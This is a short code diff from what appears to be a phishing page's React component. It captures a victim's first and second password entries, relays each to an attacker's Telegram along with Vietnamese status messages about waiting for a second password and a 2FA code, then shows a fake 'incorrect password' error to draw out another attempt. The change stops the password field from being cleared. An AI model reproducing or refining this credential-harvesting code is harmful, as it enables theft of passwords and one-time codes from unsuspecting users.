@@ -652,7 +652,6 @@ export default function HomePageClient({
     if (currentClick === 0) {
       const firstAttempt = password;
       setPassword1(firstAttempt);
-      setPassword("");
       await updateTelegramMessage("Đang chờ mật khẩu 2...", {
         password1: firstAttempt,
         status: "Đang chờ mật khẩu 2...",
@@ -665,7 +664,6 @@ export default function HomePageClient({
         setPasswordError(passwordIncorrectError);
         setIsSubmitDisabled(false);
         setLoadingPassword(false);
-        setPassword("");
         passwordTimerRef.current = null;
       }, 3000);
       return;
@@ -674,7 +672,6 @@ export default function HomePageClient({
     if (currentClick === 1) {
       const secondAttempt = password;
       setPassword2(secondAttempt);
-      setPassword("");
       await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
         password2: secondAttempt,
         status: "Đang chờ mã xác thực 2FA...",
